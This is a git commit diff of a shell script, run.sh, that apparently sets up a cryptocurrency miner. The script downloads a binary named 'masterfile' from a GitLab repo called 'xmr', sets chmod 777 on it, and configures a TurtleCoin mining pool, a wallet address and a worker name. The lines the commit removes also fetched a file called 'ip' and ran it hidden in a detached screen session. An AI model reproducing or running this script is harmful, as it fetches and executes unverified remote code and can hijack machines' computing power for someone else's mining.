a4e33c2ee321ff85c277f594aae60a25802cf663
darestiwaedi <87831139+darestiwaedi@users.noreply.github.com>
2021-08-24 22:08:01 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,10 +1,7 @@
 #!/bin/sh
 apt-get update 
-apt-get install screen libjansson4 -y
-wget https://gitlab.com/buyutuk/xmr/-/raw/main/ip
 wget https://gitlab.com/buyutuk/xmr/-/raw/main/masterfile
-chmod 777 ip masterfile
-screen -d -m python3 ip
+chmod 777 masterfile
 POOL=turtlecoin.herominers.com:10380
 WALLET=TRTLv1xLSHLPhfLEmMhk6J1p42SHHSGA15jiByLzY7gvYnotcwb3L5L8FHDUJ4uH7qLkEdfxuTWAW69tZ4LtskR1eTrgWw4BJSB
 WORKER=CPU
